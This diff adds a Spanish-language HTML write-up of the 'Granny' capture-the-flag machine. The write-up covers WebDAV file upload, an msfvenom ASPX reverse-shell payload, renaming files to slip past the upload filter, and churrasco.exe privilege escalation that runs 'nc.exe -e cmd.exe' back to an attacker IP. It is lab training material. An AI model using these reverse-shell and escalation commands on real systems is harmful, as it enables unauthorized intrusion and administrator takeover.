@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Granny</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>Granny</h1><br/><p><ol><li>Realizamos un escaneo de puertos</li><li>Solo encontramos el puerto <strong>80</strong> activo</li><li>Realizo un escaneo de subdirectorios y subdominios pero no encuentro nada</li><li>Con la extensión<strong> -sV</strong> veo que puedo realizar solicitudes <strong>POST</strong></li><li>Ejecuto <strong>davtest</strong> para ver si puedo subir archivos <strong>davtest -url  </strong><strong><a href="http://10.10.10.15">http://10.10.10.15</a></strong> </li></ol><img src="images/93-1.png" alt="images/93-1.png" /><ol><li>Vemos que podemos subir varios tipos de archivo</li><li>Creo un reverse shell con msfvenom <strong>msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=&lt;IP&gt; LPORT=4444 -o shell.aspx</strong></li><li>Cambiamos la extensión para poder subir el archivo .txt <strong>mv shell.aspx shell.txt</strong></li><li>Ahora usaré CADAVER,  una herramienta para WebDAV que me permite subir el archivo </li></ol><img src="images/93-2.png" alt="images/93-2.png" /><ol><li></li></ol><img src="images/93-3.png" alt="images/93-3.png" /><ol><li>Lo ejecuto en el navegador y obtengo la reverse</li><li>Veo que estoy con low privileges por lo que hago un systeminfo para ver que version tiene y ver por donde escalar privilegios </li></ol><img src="images/93-4.png" alt="images/93-4.png" /><ol><li>Encuentro esto para escalar privilegios <strong>Token Kidnapping Local Privilege Escalation </strong></li><li>Esto me permite ejecutar comandos como administrador</li><li>cambio la extension para poder subir la script </li></ol><img src="images/93-5.png" alt="images/93-5.png" /><ol><li></li></ol><img src="images/93-6.png" alt="images/93-6.png" /><ol><li>Ahora que tenemos subido nc para poner la reverse shell </li></ol><img src="images/93-7.png" alt="images/93-7.png" /><ol><li>Cojemos y ejecutamos nc con la script para ejecutarlo como administrador.<strong> C:\Inetpub\wwwroot&gt;churrasco.exe -d &quot;\inetpub\wwwroot\nc.exe -e cmd.exe &lt;IP&gt; 1234&quot;</strong></li><li>Obtenemos el usuario <strong>administrator</strong> </li></ol><img src="images/93-8.png" alt="images/93-8.png" /></p></div>
+</body>
+</html>
